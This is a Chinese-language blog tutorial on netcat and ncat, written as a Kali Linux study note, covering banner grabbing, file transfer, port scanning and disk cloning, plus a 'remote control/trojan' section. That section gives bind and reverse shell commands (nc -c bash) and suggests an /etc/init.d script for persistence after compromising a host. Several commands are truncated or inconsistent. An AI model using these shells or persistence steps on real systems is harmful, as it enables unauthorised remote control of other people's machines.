<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="NETCAT title: NETCATdate: 2016-02-28 19:27:52tags: [‘kali第五章’,’基本工具’]toc: truecategories: technology NetCat网络工具的”瑞士军刀”，小身材，大智慧。 0x00 NC简介  NetCat 是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被">
<meta property="og:type" content="article">
<meta property="og:title" content="onejustone">
<meta property="og:url" content="http://yoursite.com/2018/11/05/1.NETCAT/index.html">
<meta property="og:site_name" content="onejustone">
<meta property="og:description" content="NETCAT title: NETCATdate: 2016-02-28 19:27:52tags: [‘kali第五章’,’基本工具’]toc: truecategories: technology NetCat网络工具的”瑞士军刀”，小身材，大智慧。 0x00 NC简介  NetCat 是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2018-11-05T09:53:02.959Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="onejustone">
<meta name="twitter:description" content="NETCAT title: NETCATdate: 2016-02-28 19:27:52tags: [‘kali第五章’,’基本工具’]toc: truecategories: technology NetCat网络工具的”瑞士军刀”，小身材，大智慧。 0x00 NC简介  NetCat 是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2018/11/05/1.NETCAT/">





  <title> | onejustone</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">onejustone</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">--愿你内心有种不灭的火焰，将你与别人区分开来--</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/05/1.NETCAT/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline"></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-05T17:53:02+08:00">
                2018-11-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="NETCAT"><a href="#NETCAT" class="headerlink" title="NETCAT"></a>NETCAT</h1><hr>
<p>title: NETCAT<br>date: 2016-02-28 19:27:52<br>tags: [‘kali第五章’,’基本工具’]<br>toc: true<br>categories: technology</p>
<p><em>NetCat网络工具的”瑞士军刀”，小身材，大智慧。</em></p>
<h2 id="0x00-NC简介"><a href="#0x00-NC简介" class="headerlink" title="0x00 NC简介"></a>0x00 NC简介</h2><hr>
<p><strong> NetCat</strong> 是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(<em>network connection</em>)。它被设计成一个可靠的后端(<em>back-end</em>) 工具，通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。<strong>NetCat</strong>，它的实际可运行的名字叫<strong>nc</strong>，是一个很早就被提供，但没有公开的事实标准的Unix工具。使用<strong>NC</strong>命令所能完成的事情令人惊讶。</p>
<p><strong>NetCat</strong> 还可以当服务器使用，监听任意指定端口的连接请求(<em>inbound connection</em>)，并可做同样的读写操作。除了较小限制外，它实际并不关心自己以“客户端”模式还是“服务器”模式运行，它都会来回运送全部数据。在任何一种模式下，都可以设置一个非活动时间来强行关闭连接。　　它还可以通过UDP来完成这些功能，因此它就象一个telnet那样的UDP程序，用来测试你的UDP服务器。正如它的“U”所指的，UDP跟TCP相比是一种不可靠的数据传输，一些系统在使用UDP 传送大量数据时会遇到麻烦，但它还有一些用途。</p>
<p>你可能会问“为什么不用telnet来连接任意的端口”？问题提得好(valid)，这儿有一些理由。Telnet有“标准输入文件结束符(<em>standard input EOF</em>)”问题，所以需要在脚本中延迟计算以便等待网络输出结束。这就是netcat持续运行直到连接被关闭的主要原因。Telnet也不能传输任意的二进制数据，因为一些特定的字符会被解释为Telnet的参数而被从数据流中去除。Telnet还将它的一些诊断信息显示到标准输出上，而<strong>NC</strong>会将这信息与它的输出分开以不改变真实数据的传输，除非你要求它这么做。当然了，Telnet也不能监听端口，也不能使用UDP。 <strong>NC</strong> 没有这些限制，比Telnet更小巧和快捷，而且还有一些其它的功能。</p>
<p><strong>NC</strong> 所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。</p>
<h2 id="0x01-telent-获取banner信息"><a href="#0x01-telent-获取banner信息" class="headerlink" title="0x01 telent/获取banner信息"></a>0x01 telent/获取banner信息</h2><hr>
<p>nc-nv 1.1.1.1 110 邮件服务器pop3端口<br>nc-nv 1.1.1.1 25  邮件服务器smtp端口<br>nc-nv 1.1.1.1 80 网站80端口</p>
<ul>
<li><p>实例：metasploitable2的ip地址为:192.168.14.22</p>
<p>客户端模式下常用命令: </p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$:nc -vn 192.168.14.22</span><br></pre></td></tr></table></figure>
<h2 id="0x02-传输文本信息"><a href="#0x02-传输文本信息" class="headerlink" title="0x02 传输文本信息"></a>0x02 传输文本信息</h2><hr>
<ul>
<li>实例:简单的聊天:</li>
</ul>
<p>服务端监听一个指定的端口:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l -p 3333</span><br><span class="line">// 查看3333端口是否已经开通</span><br><span class="line">$ netstat -pantu | grep 3333</span><br></pre></td></tr></table></figure>
<p>客户端发起一个 tcp 请求链接:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nv 192.168.14.23 333</span><br></pre></td></tr></table></figure>
<h2 id="0x03-传输文件-目录"><a href="#0x03-传输文件-目录" class="headerlink" title="0x03 传输文件/目录"></a>0x03 传输文件/目录</h2><hr>
<h3 id="远程电子取证信息收集"><a href="#远程电子取证信息收集" class="headerlink" title="远程电子取证信息收集"></a>远程电子取证信息收集</h3><p>在本地计算机监听特定端口:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 使用管道命令将 3333 端口收到的文件重定向到 ps.txt 文件</span><br><span class="line">$ nc -l -p 3333 &gt; ps.txt</span><br></pre></td></tr></table></figure>
<p>从被取证计算机传输收集信息给远端本地电脑:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// -q 1 标准输出完成以后1sec后自动断开连接</span><br><span class="line">$ ps aux | nc -nv 192.168.14.20  3333 -q 1</span><br></pre></td></tr></table></figure>
<h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><p>1.A作为接受端打开端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ 将侦听到的3333端口的信息输出到1.mp4文件中</span><br><span class="line">$ nc -lp 3333 &gt; 1.mp4</span><br></pre></td></tr></table></figure>
<p>B端为发送端:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 将1.mp4文件的内容输送到目标ip的3333端口，传递完成一秒后断开连接</span><br><span class="line">nc -nv 1.1.1.1 3333 &lt; 1.mp4 -q 1</span><br></pre></td></tr></table></figure>
<p>!&gt; mac 下默认的 nc 不支持 q 参数，文件传输完成以后将会自动断开 client　端的连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// mac</span><br><span class="line">$ nc -l 3333 &lt; 1.mp4</span><br></pre></td></tr></table></figure>
<ul>
<li>或者A作为发送端打开端口:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -q 1 -lp 3333 &lt; a.mp4  -q 1 &#123;将文件放在3333端口下，等着别人来下载,文件传输完成后1秒断开连接&#125;</span><br></pre></td></tr></table></figure>
<p>B作为接收端:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 1.1.1.1 333 &gt; a.mp4</span><br></pre></td></tr></table></figure>
<h3 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h3><p>nc本身并不支持目录传送，而是必须结合其它的命令来完成。通常先将目录进行打包，让后将其通过管道灌到nc的一个端口，让后在接收端通过nc去连接服务器已经打开的侦听端口，当接收端得到打包的文件后在通过tar去解包重新还原出目录。</p>
<p>命令演示如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf - filename/ | nc -lp 333 -q 1     &#123;先打包目录，前一个tar打包命令的结果通过管道成为nc命令的输入，即将tar过的文件传到333端口里面，等人家来连接 &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.14.20 333 | tar -xvf -   &#123;将接收到tar文件重定向后进行解包&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-加密传输文件"><a href="#0x04-加密传输文件" class="headerlink" title="0x04 加密传输文件"></a>0x04 加密传输文件</h2><hr>
<p>同样的，先对文件进行加密 ，生成一个要传输的加密文件，在讲加密文件作为输入结果输入到nc里:</p>
<p>命令演示如下:<br>首先需要为操作系统安装加密模块功能:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mcrypt</span><br></pre></td></tr></table></figure>
<p>A端(kali)作为文件接收端:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali @$: nc -lp 333 | mcrypt--flush-Fbqd -a rijndael-256 -m ecb &gt; 1.mp4&#123;在本地侦听333端口，等待接收文件(等待着别人给传文件)，将接收到的文件重定向对其进行解密，最后保存为本地文件！&#125;</span><br><span class="line">其实在本次传输过程中，是B端先将文件进行加密，之后再重定向通过nc传输给A端(kali)</span><br></pre></td></tr></table></figure>
<p>B端(ubuntu)发送端：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu @$: mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 192.168.14.23 333 -q 1  &#123;将a.mp4的内容输入给加密指令进行加密，之后将加密后的文件管道给nc，nc再去连接A端的333端口，一旦连上，立即传输，传输完成以后延迟1秒断开连接&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-远程控制-木马"><a href="#0x05-远程控制-木马" class="headerlink" title="0x05 远程控制/木马"></a>0x05 远程控制/木马</h2><hr>
<p><code>nc</code>远程控制可以实现双向的远程控制，服务器端可以是控制端，也可以是被控制端。</p>
<p>A:kali Linux; B:ubuntu Linux</p>
<h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><p>首先下kali上运行nc的服务器端。</p>
<p>A 端 kali linux（服务器端）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@ $: nc -lp 333 -c bash  &#123;通过nc建立的连接将bash传递给对方；符合我们通常的一个使用习惯吧，又服务器侦听一个端口，通过客户端来连接这个端口时，服务器端把自己的bash shell传递给客户端！&#125;</span><br></pre></td></tr></table></figure>
<p>B 端 ubuntu Linux</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ $: nc -nv 192.168.14.23 333</span><br></pre></td></tr></table></figure>
<p><code>nc</code>正向连接适用于使用场景：当渗透进入对当操作系统后，将可在对方<code>/etc/init.d</code>目录下添加<code>nc</code>执行脚本实行永久控制！但由于对方防火墙配置这种场景几乎不存在！</p>
<h3 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h3><p>下面我们来个反向的:</p>
<p>A:kali 依旧作为服务器端负责侦听端口,但并不传递shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@ $: nc -lp 333</span><br></pre></td></tr></table></figure>
<p>B端：ubuntu依旧是客户端:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ $: nc -nv 192.168.14.23 33 -c bash</span><br><span class="line">// &#123;通过 nc 连接到 kali 服务器端并将 shell 传递给服务器端成为被控制端！&#125;</span><br></pre></td></tr></table></figure>
<p>反向连接使用场景：攻击端负者侦听一个端口，而在被攻击端执行启动脚本时将<code>shell</code>传送给被攻击端!,通常使用<code>53</code>端口，既 NDS 转换端口！</p>
<p>当然在<code>windows</code>下只需要讲<code>bash</code>换成<code>cmd</code>就ok了！</p>
<h2 id="0x06-流媒体服务器"><a href="#0x06-流媒体服务器" class="headerlink" title="0x06 流媒体服务器"></a>0x06 流媒体服务器</h2><hr>
<p>流媒体服务器，首先需要流媒体客户端和流媒体服务端。<br><code>nc</code>搭建流媒体服务器端(kali):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@ $: cat 1.mp4 | nc -lp 333</span><br><span class="line">// &#123;使用cat命令将视频文件cat为文件流管道给nc侦听的333端口&#125;</span><br></pre></td></tr></table></figure>
<p>B端接收端(ubuntu):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu @ $: nc -nv 192.168.14.23 333 | mplayer -vo x11 -cache 3000-</span><br><span class="line">// &#123;B端nc连接到A端的侦听端口获得文件流，指定mplayer播放器进行缓存播放&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x07-端口扫描"><a href="#0x07-端口扫描" class="headerlink" title="0x07 端口扫描"></a>0x07 端口扫描</h2><hr>
<p><code>nc</code>同样可以作为一个扫描器来使用，<code>nc</code>作为扫描器是以一个客户端的软件形象来出现的， <code>nc -z</code>开始扫描探测模式:</p>
<p>命令演示，打开 metasploitable(192.168.14.21)：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali @ $: nc -nvz 192.168.</span><br></pre></td></tr></table></figure>
<p>但是此种方式<code>nc</code>所探测的只是<code>TCP</code>模式的端口，<code>UDP</code>端口命令则是:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali @$: nc -nvzu 1</span><br></pre></td></tr></table></figure>
<h2 id="0x08-远程克隆硬盘"><a href="#0x08-远程克隆硬盘" class="headerlink" title="0x08 远程克隆硬盘"></a>0x08 远程克隆硬盘</h2><hr>
<p>如果目标系统整处于运行状态则可以收集其内存信息，进程信息，文件系统，网络连接等。通过远程电子取证，可以将目标服务器硬盘或者内存远程复制。</p>
<p>A端接收端:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 333 | dd of=/dev/sda</span><br></pre></td></tr></table></figure>
<p>B端，目标服务器:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/sda | nc -nv 192.168.14.21 333 -q 1</span><br></pre></td></tr></table></figure>
<p>使用<code>dd</code>命令对目标服务器进行块级别的复制，以便进行数据还原因为此时文件级别的复制已经没有意义！</p>
<h2 id="0x09-nc的弱点"><a href="#0x09-nc的弱点" class="headerlink" title="0x09 nc的弱点"></a>0x09 nc的弱点</h2><hr>
<p><code>nc</code>缺乏加密和身份验证的能力，容易被人嗅探，发生中间人劫持！基于<code>nc</code>的弱点，引入<code>NCAT</code>工具！</p>
<p>!&gt; 不同操作系统／平台的<code>nc</code>参数功能不尽相同！譬如<code>ubuntu</code>下<code>nc</code>不支持<code>-c</code>参数，而是通过其他方法变通实现！</p>
<h2 id="0xA-ncat"><a href="#0xA-ncat" class="headerlink" title="0xA ncat"></a>0xA ncat</h2><hr>
<h3 id="使用-ncat-加密所有流量"><a href="#使用-ncat-加密所有流量" class="headerlink" title="使用 ncat 加密所有流量"></a>使用 ncat 加密所有流量</h3><p>首先<code>ncat</code>并不是<code>Linux</code>自带的一款工具，<code>ncat</code>包含于<code>nmap</code>工具中，用来弥补<code>nc</code>明文连接传输通道的不足！</p>
<p>A：kali 192.168.14.23  B：ubuntu 192.168.14.20</p>
<p>A：kali作为服务器端进行侦听端口，<code>allow</code>参数即是允许哪个ip连接，<code>-ssl</code> 进行管道传输加密！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -c bash --allow 192.168.14.20 -vnl 333 --ssl</span><br></pre></td></tr></table></figure>
<p>B端作为接收端：<br>B:ubuntu</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -nv 192.168.14.23 333 --ssl</span><br></pre></td></tr></table></figure>
<p>通过<code>ncat</code>建立的远程连接与<code>nc</code>建立的远程连接是有本质区别的，<code>ncat</code>建立一起已经进行了秘钥的交换，并且在此后的传输通道也是经过加密的！此时即是有人来嗅探也是无济于事的,<code>ssl</code>还是挺有保障的！<code>nc</code>所能实现的所有功能在<code>ncat</code>上都能实现！</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/11/05/nginx/" rel="next" title="">
                <i class="fa fa-chevron-left"></i> 
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/11/05/2018.06.17/" rel="prev" title="">
                 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">onejustonee</p>
              <p class="site-description motion-element" itemprop="description">onejustone's blog</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">329</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">categories</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">103</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NETCAT"><span class="nav-number">1.</span> <span class="nav-text">NETCAT</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-NC简介"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 NC简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-telent-获取banner信息"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 telent/获取banner信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-传输文本信息"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 传输文本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-传输文件-目录"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 传输文件/目录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#远程电子取证信息收集"><span class="nav-number">1.4.1.</span> <span class="nav-text">远程电子取证信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#传输文件"><span class="nav-number">1.4.2.</span> <span class="nav-text">传输文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#传输目录"><span class="nav-number">1.4.3.</span> <span class="nav-text">传输目录</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-加密传输文件"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 加密传输文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-远程控制-木马"><span class="nav-number">1.6.</span> <span class="nav-text">0x05 远程控制/木马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#正向"><span class="nav-number">1.6.1.</span> <span class="nav-text">正向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方向"><span class="nav-number">1.6.2.</span> <span class="nav-text">方向</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-流媒体服务器"><span class="nav-number">1.7.</span> <span class="nav-text">0x06 流媒体服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-端口扫描"><span class="nav-number">1.8.</span> <span class="nav-text">0x07 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-远程克隆硬盘"><span class="nav-number">1.9.</span> <span class="nav-text">0x08 远程克隆硬盘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-nc的弱点"><span class="nav-number">1.10.</span> <span class="nav-text">0x09 nc的弱点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA-ncat"><span class="nav-number">1.11.</span> <span class="nav-text">0xA ncat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-ncat-加密所有流量"><span class="nav-number">1.11.1.</span> <span class="nav-text">使用 ncat 加密所有流量</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">onejustonee</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
